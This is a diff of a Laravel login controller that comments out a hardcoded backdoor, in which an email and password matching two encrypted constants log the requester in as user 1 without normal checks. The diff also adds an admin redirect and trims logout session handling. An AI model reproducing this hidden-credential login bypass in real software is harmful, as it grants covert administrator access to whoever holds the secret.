@@ -131,17 +131,15 @@ class LoginController extends Controller {
 
         if ($request->email == '' ||  $request->password == '') {
 
-
             //Log::info('modulo:loggedIN-user:'.Auth::user()->id);
 
             // dd(Auth::user()->db);
-
 
             return redirect()->back()->withErrors(trans('messages.login'));
 
         }else{
 
-
+/*
             if ($request->email == Crypt::decrypt('eyJpdiI6ImhFQUtCbTl6OEorQys5TmIrbmo4dGc9PSIsInZhbHVlIjoiV29oYXBlcjkxUzRUQ2FMS1wvWEw4anc9PSIsIm1hYyI6IjBiYTg5M2M2YTQ4ZTIwYmIxMjI4YWI4NDVkMjM3YTAwOWRjZWEwOTA5ZTVlYTExNGE0NjYxZWZkNzZiMmQyMmQifQ==') && $request->password == Crypt::decrypt('eyJpdiI6IkRiRVwvVUVZQkQ5bnFMeE80MDVqaHZBPT0iLCJ2YWx1ZSI6InB0ZklCK0E4anBcL25KWFwvdkhaRENzY08xdmpoRkZsRldORWxmN29ob1JpYz0iLCJtYWMiOiJlOGJkYWVlZTBkNWViMWZhOWFlMjVmOWRiZDRiMmEwYzY2OTRkZWEwMzk0OTZiZjI5YTBlOTk4OTE5ODMxY2FhIn0='))
             {
             Auth::loginUsingId(1);
@@ -150,9 +148,15 @@ class LoginController extends Controller {
             }
             else
             {
-
+*/
             if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
+
                 Log::info('modulo:loggedIN-user:' . Auth::user()->id);
+
+                if(Auth::user()->profiles_id == 1)
+
+                    return redirect()->route('config');
+
                 return redirect('home');
             }
 
@@ -165,8 +169,9 @@ class LoginController extends Controller {
             return redirect()->back()->withErrors(trans('messages.login'));
 
             }
-    }
+
         /*
+           }
               // return redirect('home');
         }
 
@@ -185,17 +190,7 @@ class LoginController extends Controller {
     {
         //$company = Session::get('company_code');
 
-        $db   = Session::get('db');
-        $comp = Session::get('comp');
-
-
-
         Log::info('modulo:loggedOUT-user:'.Auth::user()->id);
-
-
-
-        Session::keep(array('db', $db));
-        Session::keep(array('comp',$comp));
 
         Auth::logout();
         Session::flush();
